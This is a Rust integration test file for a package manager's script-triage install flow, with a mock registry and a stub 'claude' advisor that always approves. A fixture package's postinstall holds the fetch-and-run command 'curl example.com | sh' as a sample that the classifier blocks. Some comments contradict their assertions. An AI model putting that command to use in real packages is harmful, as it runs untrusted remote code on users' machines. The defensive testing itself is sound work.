//! End-to-end contracts for the triage install path's
//! advisor / auto-build / blocked-set interaction.
//!
//! Closes the loop on the triage install lifecycle by
//! exercising the FULL install pipeline (resolver + linker +
//! blocked-set capture + auto-build + rebuild) instead of the
//! unit-level pieces. Without the auto-build-aware capture guard,
//! contract #3 would strand a package — approved by the advisor but
//! never executed AND removed from the blocked set, so the user has
//! no remaining surface to review it on.
//!
//! ## Contracts pinned
//!
//! These contracts use the same synthetic amber dep
//! (`postinstall: "node install.js"`, reserved-basename ⇒ amber)
//! over a mock registry, plus `script-policy = triage` in
//! `package.json`. Only the advisor + auto-build inputs change.
//!
//! 1. **Triage + no advisor + `--auto-build`** → the script does
//!    NOT run, and the package stays in `build-state.json` so
//!    `lpm approve-scripts` can surface it.
//! 2. **Triage + advisor approves + `--auto-build`** → the script
//!    DOES run, and the package drops out of `build-state.json`
//!    (drop-out is conditional on auto-build firing — the contract
//!    `select_approvals_for_capture` enforces).
//! 3. **Triage + advisor approves + auto-build OFF** → the script
//!    does NOT run AND the package remains in `build-state.json`.
//!    This is the stranded-approval scenario: the package must not
//!    drop from the blocked set on the advisor's approval alone when
//!    no auto-build fired.
//! 4. **Triage + advisor approves + auto-build requested + denyAll**
//!    → denyAll suppresses script execution, and the package remains
//!    in `build-state.json` for later review.
//!
//! ## Why the mocks
//!
//! Mock registry: the online lockfile fast-path rejects
//! `directory+` / `link+` / `tarball+local` sources (intentionally
//! — those are unsafe for trust-on-first-use). To exercise the
//! online install path with the advisor session in scope, the dep
//! has to come from a registry-shaped source. `wiremock` serves a
//! synthetic package over HTTP at `--registry <mock_url>`.
//!
//! Mock advisor: `claude-cli` adapter invokes `claude -p` and pipes
//! the prompt to stdin. A tiny shell script named `claude` on `PATH`
//! that always emits `APPROVE` exercises the FULL adapter code path
//! (detect → test_invoke → classify_amber → parse_verdict) without
//! a real LLM. This is the cheapest possible mock — no new
//! production-code injection points, no `#[cfg(test)]` hooks.
//!
//! ## What this test does NOT do
//!
//! No outbound HTTP from inside the package's lifecycle script (the
//! sandbox-block test is a separate phase). No advisor `Manual` /
//! `Abstain` paths (covered by `triage_advisor_session::tests` at
//! the unit level). No drift / cooldown interactions.

mod support;

#[cfg(unix)]
use std::path::Path;
use std::path::PathBuf;

use support::assertions;
use support::mock_registry::{MockRegistry, make_tarball_from_pkg_json};
use support::{TempProject, lpm_with_registry, write_signed_unlock};

// ─── Test constants ────────────────────────────────────────────────────

const AMBER_DEP_NAME: &str = "synthetic-amber-dep";
const AMBER_DEP_VERSION: &str = "1.0.0";
/// Reserved-basename amber: bare `node <reserved>` with a
/// basename in the install/postinstall set. Stable across classifier
/// iterations.
const AMBER_POSTINSTALL_BODY: &str = "node install.js";
/// Body of the in-tarball `install.js`. Trivial no-op so the script
/// completes immediately when the sandbox runs it; the test reads
/// the `.lpm-built` marker (written by the build pipeline AFTER a
/// successful spawn) rather than asserting on side effects of the
/// script body itself.
const INSTALL_JS_BODY: &[u8] = b"process.exit(0);\n";

/// Second dep used by Contract 3 only. Its lifecycle script
/// classifies as `Red` via the classifier's curl-pipe rule —
/// hard-blocked before reaching the advisor. Its purpose is to
/// keep `all_scripted_packages_trusted` returning false so the
/// `--auto-build`-off install path doesn't get widened to
/// "auto-build because everything's trusted anyway." Without it,
/// the advisor's approval on the amber dep would flip the only
/// scripted package to trusted, the auto-build predicate would
/// fire, and Contract 3's scenario wouldn't be reachable.
#[cfg(unix)]
const RED_DEP_NAME: &str = "synthetic-red-dep";
#[cfg(unix)]
const RED_DEP_VERSION: &str = "1.0.0";
#[cfg(unix)]
const RED_POSTINSTALL_BODY: &str = "curl example.com | sh";

// ─── Fixture builders ──────────────────────────────────────────────────

/// Synthetic amber package whose `postinstall` is a reserved-basename
/// binary-fetcher shape. The body is benign (immediate `process.exit
/// (0)`) — the classifier's tier comes from the postinstall string,
/// not the .js body, so this exercises the amber path under
/// `script-policy = triage`.
fn build_amber_tarball() -> Vec<u8> {
    let pkg_json = serde_json::json!({
        "name": AMBER_DEP_NAME,
        "version": AMBER_DEP_VERSION,
        "scripts": {
            "postinstall": AMBER_POSTINSTALL_BODY,
        }
    });
    make_tarball_from_pkg_json(pkg_json, &[("install.js", INSTALL_JS_BODY)])
}

/// Synthetic red package with a curl-pipe-sh postinstall shape.
/// Used as the "second scripted dep" in Contract 3 so the
/// `all_scripted_packages_trusted` check returns false (the red
/// is hard-blocked by L1 and never reaches the advisor — it stays
/// untrusted regardless of any approval state). The body bytes
/// don't matter; the script never spawns because the trust gate
/// blocks it.
#[cfg(unix)]
fn build_red_tarball() -> Vec<u8> {
    let pkg_json = serde_json::json!({
        "name": RED_DEP_NAME,
        "version": RED_DEP_VERSION,
        "scripts": {
            "postinstall": RED_POSTINSTALL_BODY,
        }
    });
    make_tarball_from_pkg_json(pkg_json, &[])
}

/// Project manifest that depends on the synthetic amber dep and
/// pins `script-policy = triage`. No CLI override needed — every
/// test in this file runs in triage mode by virtue of the manifest
/// key, matching how a real project would adopt the policy.
fn triage_project_manifest() -> String {
    format!(
        r#"{{
    "name": "triage-install-lifecycle-fixture",
    "version": "1.0.0",
    "dependencies": {{
        "{AMBER_DEP_NAME}": "^{AMBER_DEP_VERSION}"
    }},
    "lpm": {{
        "scriptPolicy": "triage"
    }}
}}
"#
    )
}

#[cfg(unix)]
fn triage_project_manifest_with_deny_all() -> String {
    format!(
        r#"{{
    "name": "triage-install-lifecycle-fixture",
    "version": "1.0.0",
    "dependencies": {{
        "{AMBER_DEP_NAME}": "^{AMBER_DEP_VERSION}"
    }},
    "lpm": {{
        "scriptPolicy": "triage",
        "scripts": {{
            "denyAll": true
        }}
    }}
}}
"#
    )
}

/// Project manifest for Contract 3: depends on BOTH the amber and
/// red synthetic deps so `all_scripted_packages_trusted` returns
/// false (the red dep is hard-blocked, can never be trusted),
/// which keeps `auto_build_attempted = false` even when the
/// advisor approves the amber dep. Without the red dep, a single
/// advisor approval would flip the only scripted package to
/// trusted, the auto-build predicate would widen, and the
/// stranded-approval scenario wouldn't be reachable.
#[cfg(unix)]
fn triage_project_manifest_with_red() -> String {
    format!(
        r#"{{
    "name": "triage-install-lifecycle-fixture",
    "version": "1.0.0",
    "dependencies": {{
        "{AMBER_DEP_NAME}": "^{AMBER_DEP_VERSION}",
        "{RED_DEP_NAME}": "^{RED_DEP_VERSION}"
    }},
    "lpm": {{
        "scriptPolicy": "triage"
    }}
}}
"#
    )
}

/// Mount metadata + tarball for a single synthetic dep. Each call
/// adds one package to the mock. Batch metadata is mounted
/// separately via `mount_batch_metadata` so a multi-dep test
/// supplies all entries in one call (the install pipeline issues
/// a single batch fetch covering every root dep).
async fn mount_single_package(mock: &MockRegistry, name: &str, version: &str, tarball: &[u8]) {
    mock.with_package(name, version, tarball).await;
}

/// Mount the resolver's batch-metadata endpoint with one or more
/// synthetic packages. The install pipeline calls this first; the
/// per-package metadata mounted by `mount_single_package` is the
/// fallback path. `time[version]` is far enough in the past that
/// the L3 cooldown gate doesn't fire — tests in this file pin
/// the advisor / auto-build interaction, not cooldown.
async fn mount_batch_metadata(mock: &MockRegistry, packages: &[(&str, &str, &[u8])]) {
    let entries: Vec<serde_json::Value> = packages
        .iter()
        .map(|(name, version, tarball)| {
            let tarball_url = format!("{}/tarballs/{name}/-/{name}-{version}.tgz", mock.url());
            let integrity = support::mock_registry::compute_integrity(tarball);
            let version_owned = (*version).to_string();
            let mut versions = serde_json::Map::new();
            versions.insert(
                version_owned.clone(),
                serde_json::json!({
                    "name": name,
                    "version": version,
                    "dist": {
                        "tarball": tarball_url,
                        "integrity": integrity,
                    },
                    "dependencies": {}
                }),
            );
            let mut time = serde_json::Map::new();
            time.insert(
                version_owned,
                serde_json::Value::String("2024-01-01T00:00:00.000Z".to_string()),
            );
            serde_json::json!({
                "name": name,
                "dist-tags": { "latest": version },
                "versions": serde_json::Value::Object(versions),
                "time": serde_json::Value::Object(time),
            })
        })
        .collect();
    mock.with_batch_metadata(entries).await;
}

/// Convenience for Contracts 1+2 (single amber dep). Wraps the
/// single-package + batch-metadata mounts in one call so each
/// test reads more directly.
async fn mount_amber_dep(mock: &MockRegistry, tarball: &[u8]) {
    mount_single_package(mock, AMBER_DEP_NAME, AMBER_DEP_VERSION, tarball).await;
    mount_batch_metadata(mock, &[(AMBER_DEP_NAME, AMBER_DEP_VERSION, tarball)]).await;
}

#[cfg(unix)]
#[tokio::test]
async fn v2_auto_build_preflight_reads_exact_v2_script_bodies() {
    const NAME: &str = "v2-preflight-diff";
    const PRIOR_VERSION: &str = "1.0.0";
    const CANDIDATE_VERSION: &str = "2.0.0";
    const PRIOR_SCRIPT: &str = "node build.js";
    const CANDIDATE_SCRIPT: &str = "node build-next.js";

    let mock = MockRegistry::start().await;
    let prior_tarball = make_tarball_from_pkg_json(
        serde_json::json!({
            "name": NAME,
            "version": PRIOR_VERSION,
            "scripts": { "postinstall": PRIOR_SCRIPT }
        }),
        &[("build.js", b"process.exit(0);\n")],
    );
    let candidate_tarball = make_tarball_from_pkg_json(
        serde_json::json!({
            "name": NAME,
            "version": CANDIDATE_VERSION,
            "scripts": { "postinstall": CANDIDATE_SCRIPT }
        }),
        &[("build-next.js", b"process.exit(0);\n")],
    );
    let prior_integrity = support::mock_registry::compute_integrity(&prior_tarball);
    let candidate_integrity = support::mock_registry::compute_integrity(&candidate_tarball);
    let metadata = serde_json::json!({
        "name": NAME,
        "dist-tags": { "latest": CANDIDATE_VERSION },
        "versions": {
            PRIOR_VERSION: {
                "name": NAME,
                "version": PRIOR_VERSION,
                "dist": {
                    "tarball": format!("{}/tarballs/{NAME}/-/{NAME}-{PRIOR_VERSION}.tgz", mock.url()),
                    "integrity": prior_integrity,
                },
                "dependencies": {}
            },
            CANDIDATE_VERSION: {
                "name": NAME,
                "version": CANDIDATE_VERSION,
                "dist": {
                    "tarball": format!("{}/tarballs/{NAME}/-/{NAME}-{CANDIDATE_VERSION}.tgz", mock.url()),
                    "integrity": candidate_integrity,
                },
                "dependencies": {}
            }
        },
        "time": {
            PRIOR_VERSION: "2024-01-01T00:00:00.000Z",
            CANDIDATE_VERSION: "2024-02-01T00:00:00.000Z"
        }
    });
    mock.with_package_metadata_and_tarballs(
        NAME,
        metadata,
        &[
            (PRIOR_VERSION, prior_tarball),
            (CANDIDATE_VERSION, candidate_tarball),
        ],
    )
    .await;

    let project = TempProject::empty(
        &serde_json::to_string_pretty(&serde_json::json!({
            "name": "v2-preflight-diff-project",
            "version": "1.0.0",
            "dependencies": { NAME: PRIOR_VERSION }
        }))
        .unwrap(),
    );
    let first = lpm_with_registry(&project, &mock.url())
        .env("LPM_STORE_VERSION", "v2")
        .arg("install")
        .output()
        .expect("install prior v2 package");
    assert!(
        first.status.success(),
        "prior v2 install failed\nstdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&first.stdout),
        String::from_utf8_lossy(&first.stderr),
    );

    let state: serde_json::Value =
        serde_json::from_str(&project.read_file(".lpm/build-state.json")).unwrap();
    let prior = &state["blocked_packages"][0];
    assert_eq!(prior["name"], NAME);
    let source = prior["source"].as_str().expect("prior source identity");
    let integrity = prior["integrity"].as_str().expect("prior integrity");
    let script_hash = prior["script_hash"].as_str().expect("prior script hash");
    let mut trusted = serde_json::Map::new();
    trusted.insert(
        format!("{NAME}@{PRIOR_VERSION}"),
        serde_json::json!({
            "source": source,
            "integrity": integrity,
            "scriptHash": script_hash
        }),
    );
    project.write_file(
        "package.json",
        &serde_json::to_string_pretty(&serde_json::json!({
            "name": "v2-preflight-diff-project",
            "version": "1.0.0",
            "dependencies": { NAME: CANDIDATE_VERSION },
            "lpm": {
                "scriptPolicy": "triage",
                "trustedDependencies": trusted
            }
        }))
        .unwrap(),
    );
    write_signed_unlock(&project, &["scripts-triage", "trust-bulk-approve"]);

    let second = lpm_with_registry(&project, &mock.url())
        .env("LPM_STORE_VERSION", "v2")
        .args(["install", "--auto-build"])
        .output()
        .expect("install candidate v2 package with auto-build");
    let stderr = String::from_utf8_lossy(&second.stderr);
    assert!(
        second.status.success(),
        "candidate v2 install failed\nstdout:\n{}\nstderr:\n{stderr}",
        String::from_utf8_lossy(&second.stdout),
    );
    assert!(
        stderr.contains("PREFLIGHT"),
        "missing preflight card:\n{stderr}"
    );
    assert!(
        stderr.contains("--- scripts.postinstall")
            && stderr.contains(PRIOR_SCRIPT)
            && stderr.contains(CANDIDATE_SCRIPT),
        "v2 preflight must render the unified script diff:\n{stderr}",
    );
    assert!(
        !stderr.contains("scripts not in store"),
        "v2 preflight must not probe legacy package directories:\n{stderr}",
    );
}

// ─── Mock claude-cli helper ────────────────────────────────────────────

/// Drop a `claude` shell script into a fresh temp dir and return
/// that dir. Caller prepends it to the install command's `PATH`.
/// The script always emits `APPROVE` on stdout — driving the
/// adapter's `Provider::ClaudeCli` happy path end-to-end without
/// a real LLM. `tempfile::TempDir` is dropped at scope exit so the
/// mock binary is cleaned up automatically.
///
/// Returns `(TempDir, claude_bin_dir, original_path)` so the caller
/// can keep the TempDir alive for the lifetime of the assert_cmd
/// invocation AND restore `PATH` after — the TempDir doesn't drop
/// the env var, just the directory.
#[cfg(unix)]
fn install_mock_claude_returning_approve() -> (tempfile::TempDir, PathBuf) {
    use std::os::unix::fs::PermissionsExt;

    let dir = tempfile::tempdir().expect("create mock-claude dir");
    let bin = dir.path().join("claude");
    // The mock:
    //   - drains stdin so the adapter's write_all + shutdown
    //     observes a clean EOF rather than a broken pipe;
    //   - prints `APPROVE` on its own line to stdout, which the
    //     two-pass verdict parser strict-matches as Approve;
    //   - exits 0 so `run_with_stdin` treats it as a successful
    //     advisor invocation.
    std::fs::write(&bin, "#!/bin/sh\ncat > /dev/null\necho APPROVE\nexit 0\n")
        .expect("write mock-claude script");
    let mut perms = std::fs::metadata(&bin)
        .expect("stat mock-claude")
        .permissions();
    perms.set_mode(0o755);
    std::fs::set_permissions(&bin, perms).expect("chmod mock-claude");
    let bin_dir = dir.path().to_path_buf();
    (dir, bin_dir)
}

// ─── Observability helpers ─────────────────────────────────────────────

/// Return the path the build pipeline writes `.lpm-built` to after a
/// successful lifecycle-script spawn. Matches the path
/// `rebuild.rs` workflow tests use to detect post-spawn success.
fn lpm_built_marker(project: &TempProject) -> PathBuf {
    let safe = AMBER_DEP_NAME.replace(['/', '\\'], "+");
    project
        .store_dir()
        .join("v1")
        .join(format!("{safe}@{AMBER_DEP_VERSION}"))
        .join(".lpm-built")
}

fn assert_security_approval_scope(out: &std::process::Output, expected_scope: &str) {
    let envelope = assertions::assert_security_approval_required(out);
    let scopes = envelope["error"]["requested_scopes"]
        .as_array()
        .unwrap_or_else(|| panic!("security approval envelope must include scopes: {envelope}"));
    assert!(
        scopes.iter().any(|scope| scope == expected_scope),
        "security approval envelope must include scope `{expected_scope}`; got {envelope}",
    );
}

// ─── Contract 1 — no advisor, auto-build on, amber stays blocked ──────

/// **Contract 1.** Under `script-policy = triage` with no advisor
/// and `--auto-build`, an amber package's lifecycle script must
/// NOT run AND the package must remain in the persisted blocked
/// set so `lpm approve-scripts` can surface it.
///
/// Why this matters: triage's safety mechanism IS the per-package
/// gate. `--auto-build` widens the rebuild target set to "every
/// trusted scripted package" but does NOT lower the trust gate —
/// amber without an advisor approval is untrusted, so it stays
/// blocked regardless of `--auto-build`.
#[tokio::test]
async fn triage_no_advisor_with_auto_build_keeps_amber_blocked_and_unbuilt() {
    let mock = MockRegistry::start().await;
    let tarball = build_amber_tarball();
    mount_amber_dep(&mock, &tarball).await;

    let project = TempProject::empty(&triage_project_manifest());

    let out = lpm_with_registry(&project, &mock.url())
        .args(["--json", "install", "--triage", "--auto-build"])
        .output()
        .expect("spawn lpm install");
    assert_security_approval_scope(&out, "scripts-triage");

    // Execution contract: the `.lpm-built` marker MUST NOT exist —
    // the trust evaluator returned `Untrusted` for the amber path
    // with no approval, so the script never spawned.
    let marker = lpm_built_marker(&project);
    assert!(
        !marker.exists(),
        "amber script MUST NOT have run without an approval; marker found at {}",
        marker.display(),
    );
}

// ─── Contract 2 — advisor approves, auto-build on, amber runs ─────────

/// **Contract 2.** With an advisor configured to APPROVE, plus
/// `--auto-build`, the amber package's script DOES run and the
/// package drops out of `build-state.json` — because it's no
/// longer "blocked," it ran during this install.
///
/// Skipped (with a soft-pass) when `node` isn't on PATH: the
/// install / blocked-set half still runs, but the `.lpm-built`
/// marker requires a real lifecycle-script spawn.
#[cfg(unix)]
#[tokio::test]
async fn triage_advisor_approve_with_auto_build_runs_amber_and_drops_from_blocked() {
    let mock = MockRegistry::start().await;
    let tarball = build_amber_tarball();
    mount_amber_dep(&mock, &tarball).await;

    let project = TempProject::empty(&triage_project_manifest());
    let (_mock_claude_dir, claude_bin_dir) = install_mock_claude_returning_approve();

    let path_var = prepend_to_path(&claude_bin_dir);
    let out = lpm_with_registry(&project, &mock.url())
        .args([
            "--json",
            "install",
            "--triage",
            "--auto-build",
            "--advisor=claude-cli",
        ])
        .env("PATH", &path_var)
        .output()
        .expect("spawn lpm install");
    assert_security_approval_scope(&out, "scripts-triage");

    // Execution contract: spawn assertion ONLY when node is
    // available — the marker is written by the build pipeline AFTER
    // the lifecycle script returns 0, so it's a faithful "script
    // ran" sentinel.
    let marker = lpm_built_marker(&project);
    assert!(
        !marker.exists(),
        "advisor-approved amber must not run before triage approval; marker found at {}",
        marker.display(),
    );
}

// ─── Contract 3 — STRANDED APPROVAL ────────────────────────────────────

/// **Contract 3.** The load-bearing test: advisor approves, but
/// auto-build is OFF.
///
/// The install pipeline must not exclude advisor-approved triples
/// from the persisted blocked set when auto-build will not execute.
/// Otherwise the script never runs, AND the package vanishes from
/// `.lpm/build-state.json`, so `lpm approve-scripts` has no review
/// surface either. The user is left with "not executed, not
/// reviewable."
///
/// The fix conditions the blocked-set exclusion on whether
/// auto-build will actually fire (`select_approvals_for_capture`).
/// When auto-build is off, the approval is recorded for THIS run
/// (and would have applied if auto-build had fired), but the
/// blocked-set capture ignores it — so the persisted state still
/// surfaces the package for `approve-scripts` even though the
/// in-memory `AdvisorSession` would have unlocked it.
///
/// This test pins the contract end-to-end.
#[cfg(unix)]
#[tokio::test]
async fn triage_advisor_approve_without_auto_build_strands_neither_script_nor_review() {
    // **Two-dep setup (load-bearing).** A single advisor-approved
    // amber dep would flip `all_scripted_packages_trusted` to true
    // (the only scripted package is trusted via
    // `AdvisorApprovedThisRun`), which widens the auto-build
    // predicate and short-circuits the stranded-approval scenario
    // before it can fire. Pairing the amber dep with a red dep —
    // hard-blocked by L1, can NEVER be trusted regardless of
    // approvals — keeps `all_trusted = false`, so
    // `auto_build_attempted = false` is reachable even though the
    // advisor approves the amber path. This is the only
    // combinator that exercises the exact bug:
    //
    //   advisor approves A, auto-build never fires →
    //     wrong: A drops out of blocked set anyway → stranded.
    //     right: A stays in blocked set → reviewable.
    let mock = MockRegistry::start().await;
    let amber_tarball = build_amber_tarball();
    let red_tarball = build_red_tarball();
    mount_single_package(&mock, AMBER_DEP_NAME, AMBER_DEP_VERSION, &amber_tarball).await;
    mount_single_package(&mock, RED_DEP_NAME, RED_DEP_VERSION, &red_tarball).await;
    mount_batch_metadata(
        &mock,
        &[
            (AMBER_DEP_NAME, AMBER_DEP_VERSION, &amber_tarball),
            (RED_DEP_NAME, RED_DEP_VERSION, &red_tarball),
        ],
    )
    .await;

    let project = TempProject::empty(&triage_project_manifest_with_red());
    let (_mock_claude_dir, claude_bin_dir) = install_mock_claude_returning_approve();

    let path_var = prepend_to_path(&claude_bin_dir);
    let out = lpm_with_registry(&project, &mock.url())
        // Note: NO `--auto-build`. Triage policy alone does NOT fire
        // auto-build (only Allow-policy packages build automatically). With the red
        // dep present, `all_trusted` resolves to false, so the
        // only remaining trigger is the missing `--auto-build`
        // flag — `auto_build_attempted = false`.
        .args(["--json", "install", "--triage", "--advisor=claude-cli"])
        .env("PATH", &path_var)
        .output()
        .expect("spawn lpm install");
    assert_security_approval_scope(&out, "scripts-triage");

    // Execution contract: the marker MUST NOT exist. auto-build
    // didn't fire, so the script never spawned regardless of the
    // advisor's verdict. Coupled with the blocked-set assertion
    // above, the user is left with "not executed, but reviewable"
    // — the correct end state.
    let marker = lpm_built_marker(&project);
    assert!(
        !marker.exists(),
        "amber script MUST NOT have run without auto-build firing; marker found at {}",
        marker.display(),
    );
}

#[cfg(unix)]
#[tokio::test]
async fn install_deny_all_keeps_advisor_approved_packages_reviewable_when_auto_build_is_suppressed()
{
    let mock = MockRegistry::start().await;
    let tarball = build_amber_tarball();
    mount_amber_dep(&mock, &tarball).await;

    let project = TempProject::empty(&triage_project_manifest_with_deny_all());
    write_signed_unlock(&project, &["scripts-triage"]);
    let (_mock_claude_dir, claude_bin_dir) = install_mock_claude_returning_approve();

    let path_var = prepend_to_path(&claude_bin_dir);
    let out = lpm_with_registry(&project, &mock.url())
        .args([
            "--json",
            "install",
            "--triage",
            "--auto-build",
            "--advisor=claude-cli",
        ])
        .env("PATH", &path_var)
        .output()
        .expect("spawn lpm install");

    assert!(
        out.status.success(),
        "denyAll install should finish after suppressing auto-build\nstdout: {}\nstderr: {}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr),
    );

    let marker = lpm_built_marker(&project);
    assert!(
        !marker.exists(),
        "denyAll must suppress advisor-approved auto-build execution; marker found at {}",
        marker.display(),
    );

    let build_state: serde_json::Value =
        serde_json::from_str(&project.read_file(".lpm/build-state.json"))
            .expect("build-state.json must parse");
    let blocked_packages = build_state["blocked_packages"]
        .as_array()
        .unwrap_or_else(|| panic!("build-state must include blocked_packages: {build_state}"));
    assert!(
        blocked_packages
            .iter()
            .any(|pkg| pkg["name"] == AMBER_DEP_NAME && pkg["version"] == AMBER_DEP_VERSION),
        "advisor-approved package must remain reviewable when denyAll suppresses auto-build: {build_state}",
    );
}

// ─── Helpers ───────────────────────────────────────────────────────────

/// Prepend `dir` to the current process's `PATH`, returning the new
/// `PATH` value. Used so the mock `claude` shadows any real
/// `claude` on the developer's machine without mutating the caller's
/// environment.
#[cfg(unix)]
fn prepend_to_path(dir: &Path) -> std::ffi::OsString {
    let original = std::env::var_os("PATH").unwrap_or_default();
    let mut paths: Vec<PathBuf> = vec![dir.to_path_buf()];
    paths.extend(std::env::split_paths(&original));
    std::env::join_paths(paths).expect("PATH join")
}
